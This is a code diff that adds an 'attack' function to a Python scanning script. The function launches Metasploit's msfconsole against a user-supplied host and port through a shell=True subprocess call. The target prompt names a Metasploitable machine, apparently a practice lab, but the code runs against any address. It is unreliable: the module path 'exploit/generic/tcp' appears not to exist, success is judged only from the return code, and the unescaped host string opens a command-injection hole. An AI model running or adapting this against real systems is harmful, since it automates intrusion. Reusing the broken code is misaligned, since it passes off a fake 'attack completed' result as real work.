@@ -69,8 +69,31 @@ def nmap_scan(ip_address, port_range):
 
 # Function to exploit open ports
 def attack(host, port):
-    # Attack using nmap recon scans
-    return
+    # Runs a Metasploit module against the target host and port
+    # Generic TCP exploit
+    try:
+        # This command will launch msfconsole, seleecting the generic TCP exploit module, setting the target host and port, and running the exploit
+        msf_command = f"msfconsole -x 'use exploit/generic/tcp; set RHOSTS {host}; set RPORT {port}; exploit'"
+
+        # Execute the command
+        process = subprocess.Popen(msf_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        stdout, stderr = process.communicate()  # Capture the output
+
+        print("Metasploit Output:")
+        print(stdout.decode())
+        print("Metasploit Errors:")
+        print(stderr.decode())
+
+        if process.returncode != 0:
+            print(f"Metasploit failed with return code {process.returncode}")
+        else:
+            print("Metasploit attack completed successfully")
+
+    except FileNotFoundError:
+        print("Metasploit is not installed. Please install it and try again.")
+    except Exception as e:
+        print(f"Metasploit failed with error: {e}")
+
 
 def main():
     metasploitable_ip = input("Enter the IP address of the target machine: ")
